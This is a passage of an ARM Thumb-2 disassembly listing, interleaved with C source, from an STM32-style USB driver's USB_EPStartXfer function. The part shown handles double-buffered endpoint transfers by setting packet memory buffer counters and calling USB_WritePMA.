 8006fa4:	6959      	ldr	r1, [r3, #20]
 8006fa6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006faa:	b29b      	uxth	r3, r3
 8006fac:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006fb0:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006fb4:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006fb8:	6800      	ldr	r0, [r0, #0]
 8006fba:	f001 fb66 	bl	800868a <USB_WritePMA>
            ep->xfer_buff += len;
 8006fbe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fc2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fc6:	681b      	ldr	r3, [r3, #0]
 8006fc8:	695a      	ldr	r2, [r3, #20]
 8006fca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fce:	441a      	add	r2, r3
 8006fd0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fd4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fd8:	681b      	ldr	r3, [r3, #0]
 8006fda:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006fdc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fe0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fe4:	681b      	ldr	r3, [r3, #0]
 8006fe6:	6a1a      	ldr	r2, [r3, #32]
 8006fe8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ff0:	681b      	ldr	r3, [r3, #0]
 8006ff2:	691b      	ldr	r3, [r3, #16]
 8006ff4:	429a      	cmp	r2, r3
 8006ff6:	d90f      	bls.n	8007018 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006ff8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ffc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007000:	681b      	ldr	r3, [r3, #0]
 8007002:	6a1a      	ldr	r2, [r3, #32]
 8007004:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007008:	1ad2      	subs	r2, r2, r3
 800700a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800700e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007012:	681b      	ldr	r3, [r3, #0]
 8007014:	621a      	str	r2, [r3, #32]
 8007016:	e00e      	b.n	8007036 <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8007018:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800701c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007020:	681b      	ldr	r3, [r3, #0]
 8007022:	6a1b      	ldr	r3, [r3, #32]
 8007024:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8007028:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800702c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007030:	681b      	ldr	r3, [r3, #0]
 8007032:	2200      	movs	r2, #0
 8007034:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007036:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800703a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800703e:	681b      	ldr	r3, [r3, #0]
 8007040:	785b      	ldrb	r3, [r3, #1]
 8007042:	2b00      	cmp	r3, #0
 8007044:	d177      	bne.n	8007136 <USB_EPStartXfer+0x4c4>
 8007046:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800704a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800704e:	681b      	ldr	r3, [r3, #0]
 8007050:	61bb      	str	r3, [r7, #24]
 8007052:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007056:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800705a:	681b      	ldr	r3, [r3, #0]
 800705c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007060:	b29b      	uxth	r3, r3
 8007062:	461a      	mov	r2, r3
 8007064:	69bb      	ldr	r3, [r7, #24]
 8007066:	4413      	add	r3, r2
 8007068:	61bb      	str	r3, [r7, #24]
 800706a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800706e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007072:	681b      	ldr	r3, [r3, #0]
 8007074:	781b      	ldrb	r3, [r3, #0]
 8007076:	00da      	lsls	r2, r3, #3
 8007078:	69bb      	ldr	r3, [r7, #24]
 800707a:	4413      	add	r3, r2
 800707c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007080:	617b      	str	r3, [r7, #20]
 8007082:	697b      	ldr	r3, [r7, #20]
 8007084:	881b      	ldrh	r3, [r3, #0]
 8007086:	b29b      	uxth	r3, r3
 8007088:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800708c:	b29a      	uxth	r2, r3
 800708e:	697b      	ldr	r3, [r7, #20]
 8007090:	801a      	strh	r2, [r3, #0]
 8007092:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007096:	2b3e      	cmp	r3, #62	; 0x3e
 8007098:	d921      	bls.n	80070de <USB_EPStartXfer+0x46c>
 800709a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800709e:	095b      	lsrs	r3, r3, #5
 80070a0:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 80070a4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070a8:	f003 031f 	and.w	r3, r3, #31
 80070ac:	2b00      	cmp	r3, #0
 80070ae:	d104      	bne.n	80070ba <USB_EPStartXfer+0x448>
 80070b0:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 80070b4:	3b01      	subs	r3, #1
 80070b6:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 80070ba:	697b      	ldr	r3, [r7, #20]
 80070bc:	881b      	ldrh	r3, [r3, #0]
 80070be:	b29a      	uxth	r2, r3
 80070c0:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 80070c4:	b29b      	uxth	r3, r3
 80070c6:	029b      	lsls	r3, r3, #10
 80070c8:	b29b      	uxth	r3, r3
 80070ca:	4313      	orrs	r3, r2
 80070cc:	b29b      	uxth	r3, r3
 80070ce:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80070d2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80070d6:	b29a      	uxth	r2, r3
 80070d8:	697b      	ldr	r3, [r7, #20]
 80070da:	801a      	strh	r2, [r3, #0]
 80070dc:	e056      	b.n	800718c <USB_EPStartXfer+0x51a>
 80070de:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070e2:	2b00      	cmp	r3, #0
 80070e4:	d10a      	bne.n	80070fc <USB_EPStartXfer+0x48a>
 80070e6:	697b      	ldr	r3, [r7, #20]
 80070e8:	881b      	ldrh	r3, [r3, #0]
 80070ea:	b29b      	uxth	r3, r3
 80070ec:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80070f0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80070f4:	b29a      	uxth	r2, r3
 80070f6:	697b      	ldr	r3, [r7, #20]
 80070f8:	801a      	strh	r2, [r3, #0]
 80070fa:	e047      	b.n	800718c <USB_EPStartXfer+0x51a>
 80070fc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007100:	085b      	lsrs	r3, r3, #1
 8007102:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007106:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800710a:	f003 0301 	and.w	r3, r3, #1
 800710e:	2b00      	cmp	r3, #0
 8007110:	d004      	beq.n	800711c <USB_EPStartXfer+0x4aa>
 8007112:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007116:	3301      	adds	r3, #1
 8007118:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 800711c:	697b      	ldr	r3, [r7, #20]
 800711e:	881b      	ldrh	r3, [r3, #0]
 8007120:	b29a      	uxth	r2, r3
 8007122:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007126:	b29b      	uxth	r3, r3
 8007128:	029b      	lsls	r3, r3, #10
 800712a:	b29b      	uxth	r3, r3
 800712c:	4313      	orrs	r3, r2
 800712e:	b29a      	uxth	r2, r3
 8007130:	697b      	ldr	r3, [r7, #20]
 8007132:	801a      	strh	r2, [r3, #0]
 8007134:	e02a      	b.n	800718c <USB_EPStartXfer+0x51a>
 8007136:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800713a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800713e:	681b      	ldr	r3, [r3, #0]
 8007140:	785b      	ldrb	r3, [r3, #1]
 8007142:	2b01      	cmp	r3, #1
 8007144:	d122      	bne.n	800718c <USB_EPStartXfer+0x51a>
 8007146:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800714a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800714e:	681b      	ldr	r3, [r3, #0]
 8007150:	623b      	str	r3, [r7, #32]
 8007152:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007156:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800715a:	681b      	ldr	r3, [r3, #0]
 800715c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007160:	b29b      	uxth	r3, r3
 8007162:	461a      	mov	r2, r3
 8007164:	6a3b      	ldr	r3, [r7, #32]
 8007166:	4413      	add	r3, r2
 8007168:	623b      	str	r3, [r7, #32]
 800716a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800716e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007172:	681b      	ldr	r3, [r3, #0]
 8007174:	781b      	ldrb	r3, [r3, #0]
 8007176:	00da      	lsls	r2, r3, #3
 8007178:	6a3b      	ldr	r3, [r7, #32]
 800717a:	4413      	add	r3, r2
 800717c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007180:	61fb      	str	r3, [r7, #28]
 8007182:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007186:	b29a      	uxth	r2, r3
 8007188:	69fb      	ldr	r3, [r7, #28]
 800718a:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 800718c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007190:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007194:	681b      	ldr	r3, [r3, #0]
 8007196:	891b      	ldrh	r3, [r3, #8]
 8007198:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800719c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071a0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071a4:	681b      	ldr	r3, [r3, #0]
 80071a6:	6959      	ldr	r1, [r3, #20]
 80071a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ac:	b29b      	uxth	r3, r3
 80071ae:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80071b2:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80071b6:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80071ba:	6800      	ldr	r0, [r0, #0]
 80071bc:	f001 fa65 	bl	800868a <USB_WritePMA>
 80071c0:	e3ee      	b.n	80079a0 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 80071c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071ca:	681b      	ldr	r3, [r3, #0]
 80071cc:	785b      	ldrb	r3, [r3, #1]
 80071ce:	2b00      	cmp	r3, #0
 80071d0:	d177      	bne.n	80072c2 <USB_EPStartXfer+0x650>
 80071d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071d6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071da:	681b      	ldr	r3, [r3, #0]
 80071dc:	64bb      	str	r3, [r7, #72]	; 0x48
 80071de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071e2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071e6:	681b      	ldr	r3, [r3, #0]
 80071e8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80071ec:	b29b      	uxth	r3, r3
 80071ee:	461a      	mov	r2, r3
 80071f0:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80071f2:	4413      	add	r3, r2
 80071f4:	64bb      	str	r3, [r7, #72]	; 0x48
 80071f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071fe:	681b      	ldr	r3, [r3, #0]
 8007200:	781b      	ldrb	r3, [r3, #0]
 8007202:	00da      	lsls	r2, r3, #3
 8007204:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8007206:	4413      	add	r3, r2
 8007208:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800720c:	647b      	str	r3, [r7, #68]	; 0x44
 800720e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007210:	881b      	ldrh	r3, [r3, #0]
 8007212:	b29b      	uxth	r3, r3
 8007214:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007218:	b29a      	uxth	r2, r3
 800721a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800721c:	801a      	strh	r2, [r3, #0]
 800721e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007222:	2b3e      	cmp	r3, #62	; 0x3e
 8007224:	d921      	bls.n	800726a <USB_EPStartXfer+0x5f8>
 8007226:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800722a:	095b      	lsrs	r3, r3, #5
 800722c:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007230:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007234:	f003 031f 	and.w	r3, r3, #31
 8007238:	2b00      	cmp	r3, #0
 800723a:	d104      	bne.n	8007246 <USB_EPStartXfer+0x5d4>
 800723c:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007240:	3b01      	subs	r3, #1
 8007242:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007246:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007248:	881b      	ldrh	r3, [r3, #0]
 800724a:	b29a      	uxth	r2, r3
 800724c:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007250:	b29b      	uxth	r3, r3
 8007252:	029b      	lsls	r3, r3, #10
 8007254:	b29b      	uxth	r3, r3
 8007256:	4313      	orrs	r3, r2
 8007258:	b29b      	uxth	r3, r3
 800725a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800725e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007262:	b29a      	uxth	r2, r3
 8007264:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007266:	801a      	strh	r2, [r3, #0]
 8007268:	e056      	b.n	8007318 <USB_EPStartXfer+0x6a6>
 800726a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800726e:	2b00      	cmp	r3, #0
 8007270:	d10a      	bne.n	8007288 <USB_EPStartXfer+0x616>
 8007272:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007274:	881b      	ldrh	r3, [r3, #0]
 8007276:	b29b      	uxth	r3, r3
 8007278:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800727c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007280:	b29a      	uxth	r2, r3
 8007282:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007284:	801a      	strh	r2, [r3, #0]
 8007286:	e047      	b.n	8007318 <USB_EPStartXfer+0x6a6>
 8007288:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800728c:	085b      	lsrs	r3, r3, #1
 800728e:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007292:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007296:	f003 0301 	and.w	r3, r3, #1
 800729a:	2b00      	cmp	r3, #0
 800729c:	d004      	beq.n	80072a8 <USB_EPStartXfer+0x636>
 800729e:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80072a2:	3301      	adds	r3, #1
 80072a4:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80072a8:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80072aa:	881b      	ldrh	r3, [r3, #0]
 80072ac:	b29a      	uxth	r2, r3
 80072ae:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80072b2:	b29b      	uxth	r3, r3
 80072b4:	029b      	lsls	r3, r3, #10
 80072b6:	b29b      	uxth	r3, r3
 80072b8:	4313      	orrs	r3, r2
 80072ba:	b29a      	uxth	r2, r3
 80072bc:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80072be:	801a      	strh	r2, [r3, #0]
 80072c0:	e02a      	b.n	8007318 <USB_EPStartXfer+0x6a6>
 80072c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ca:	681b      	ldr	r3, [r3, #0]
 80072cc:	785b      	ldrb	r3, [r3, #1]
 80072ce:	2b01      	cmp	r3, #1
 80072d0:	d122      	bne.n	8007318 <USB_EPStartXfer+0x6a6>
 80072d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072d6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072da:	681b      	ldr	r3, [r3, #0]
 80072dc:	653b      	str	r3, [r7, #80]	; 0x50
 80072de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072e2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072e6:	681b      	ldr	r3, [r3, #0]
 80072e8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80072ec:	b29b      	uxth	r3, r3
 80072ee:	461a      	mov	r2, r3
 80072f0:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80072f2:	4413      	add	r3, r2
 80072f4:	653b      	str	r3, [r7, #80]	; 0x50
 80072f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072fe:	681b      	ldr	r3, [r3, #0]
 8007300:	781b      	ldrb	r3, [r3, #0]
 8007302:	00da      	lsls	r2, r3, #3
 8007304:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8007306:	4413      	add	r3, r2
 8007308:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800730c:	64fb      	str	r3, [r7, #76]	; 0x4c
 800730e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007312:	b29a      	uxth	r2, r3
 8007314:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8007316:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8007318:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800731c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007320:	681b      	ldr	r3, [r3, #0]
 8007322:	891b      	ldrh	r3, [r3, #8]
 8007324:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007328:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800732c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007330:	681b      	ldr	r3, [r3, #0]
 8007332:	6959      	ldr	r1, [r3, #20]
 8007334:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007338:	b29b      	uxth	r3, r3
 800733a:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800733e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007342:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007346:	6800      	ldr	r0, [r0, #0]
 8007348:	f001 f99f 	bl	800868a <USB_WritePMA>
            ep->xfer_buff += len;
 800734c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007350:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007354:	681b      	ldr	r3, [r3, #0]
 8007356:	695a      	ldr	r2, [r3, #20]
 8007358:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800735c:	441a      	add	r2, r3
 800735e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007362:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007366:	681b      	ldr	r3, [r3, #0]
 8007368:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 800736a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800736e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007372:	681b      	ldr	r3, [r3, #0]
 8007374:	6a1a      	ldr	r2, [r3, #32]
 8007376:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800737a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800737e:	681b      	ldr	r3, [r3, #0]
 8007380:	691b      	ldr	r3, [r3, #16]
 8007382:	429a      	cmp	r2, r3
 8007384:	d90f      	bls.n	80073a6 <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 8007386:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800738a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800738e:	681b      	ldr	r3, [r3, #0]
 8007390:	6a1a      	ldr	r2, [r3, #32]
 8007392:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007396:	1ad2      	subs	r2, r2, r3
 8007398:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800739c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073a0:	681b      	ldr	r3, [r3, #0]
 80073a2:	621a      	str	r2, [r3, #32]
 80073a4:	e00e      	b.n	80073c4 <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 80073a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073ae:	681b      	ldr	r3, [r3, #0]
 80073b0:	6a1b      	ldr	r3, [r3, #32]
 80073b2:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 80073b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073be:	681b      	ldr	r3, [r3, #0]
 80073c0:	2200      	movs	r2, #0
 80073c2:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 80073c4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073c8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073cc:	681b      	ldr	r3, [r3, #0]
 80073ce:	643b      	str	r3, [r7, #64]	; 0x40
 80073d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073d4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073d8:	681b      	ldr	r3, [r3, #0]
 80073da:	785b      	ldrb	r3, [r3, #1]
 80073dc:	2b00      	cmp	r3, #0
 80073de:	d177      	bne.n	80074d0 <USB_EPStartXfer+0x85e>
 80073e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073e4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073e8:	681b      	ldr	r3, [r3, #0]
 80073ea:	63bb      	str	r3, [r7, #56]	; 0x38
 80073ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073f4:	681b      	ldr	r3, [r3, #0]
 80073f6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80073fa:	b29b      	uxth	r3, r3
 80073fc:	461a      	mov	r2, r3
 80073fe:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007400:	4413      	add	r3, r2
 8007402:	63bb      	str	r3, [r7, #56]	; 0x38
 8007404:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007408:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800740c:	681b      	ldr	r3, [r3, #0]
 800740e:	781b      	ldrb	r3, [r3, #0]
 8007410:	00da      	lsls	r2, r3, #3
 8007412:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007414:	4413      	add	r3, r2
 8007416:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800741a:	637b      	str	r3, [r7, #52]	; 0x34
 800741c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800741e:	881b      	ldrh	r3, [r3, #0]
 8007420:	b29b      	uxth	r3, r3
 8007422:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007426:	b29a      	uxth	r2, r3
 8007428:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800742a:	801a      	strh	r2, [r3, #0]
 800742c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007430:	2b3e      	cmp	r3, #62	; 0x3e
 8007432:	d921      	bls.n	8007478 <USB_EPStartXfer+0x806>
 8007434:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007438:	095b      	lsrs	r3, r3, #5
 800743a:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800743e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007442:	f003 031f 	and.w	r3, r3, #31
 8007446:	2b00      	cmp	r3, #0
 8007448:	d104      	bne.n	8007454 <USB_EPStartXfer+0x7e2>
 800744a:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 800744e:	3b01      	subs	r3, #1
 8007450:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007454:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007456:	881b      	ldrh	r3, [r3, #0]
 8007458:	b29a      	uxth	r2, r3
 800745a:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 800745e:	b29b      	uxth	r3, r3
 8007460:	029b      	lsls	r3, r3, #10
 8007462:	b29b      	uxth	r3, r3
 8007464:	4313      	orrs	r3, r2
 8007466:	b29b      	uxth	r3, r3
 8007468:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800746c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007470:	b29a      	uxth	r2, r3
 8007472:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007474:	801a      	strh	r2, [r3, #0]
 8007476:	e050      	b.n	800751a <USB_EPStartXfer+0x8a8>
 8007478:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800747c:	2b00      	cmp	r3, #0
 800747e:	d10a      	bne.n	8007496 <USB_EPStartXfer+0x824>
 8007480:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007482:	881b      	ldrh	r3, [r3, #0]
 8007484:	b29b      	uxth	r3, r3
 8007486:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800748a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800748e:	b29a      	uxth	r2, r3
 8007490:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007492:	801a      	strh	r2, [r3, #0]
 8007494:	e041      	b.n	800751a <USB_EPStartXfer+0x8a8>
 8007496:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800749a:	085b      	lsrs	r3, r3, #1
 800749c:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80074a0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074a4:	f003 0301 	and.w	r3, r3, #1
 80074a8:	2b00      	cmp	r3, #0
 80074aa:	d004      	beq.n	80074b6 <USB_EPStartXfer+0x844>
 80074ac:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80074b0:	3301      	adds	r3, #1
 80074b2:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80074b6:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80074b8:	881b      	ldrh	r3, [r3, #0]
 80074ba:	b29a      	uxth	r2, r3
 80074bc:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80074c0:	b29b      	uxth	r3, r3
 80074c2:	029b      	lsls	r3, r3, #10
 80074c4:	b29b      	uxth	r3, r3
 80074c6:	4313      	orrs	r3, r2
 80074c8:	b29a      	uxth	r2, r3
 80074ca:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80074cc:	801a      	strh	r2, [r3, #0]
 80074ce:	e024      	b.n	800751a <USB_EPStartXfer+0x8a8>
 80074d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074d4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074d8:	681b      	ldr	r3, [r3, #0]
 80074da:	785b      	ldrb	r3, [r3, #1]
 80074dc:	2b01      	cmp	r3, #1
 80074de:	d11c      	bne.n	800751a <USB_EPStartXfer+0x8a8>
 80074e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074e4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074e8:	681b      	ldr	r3, [r3, #0]
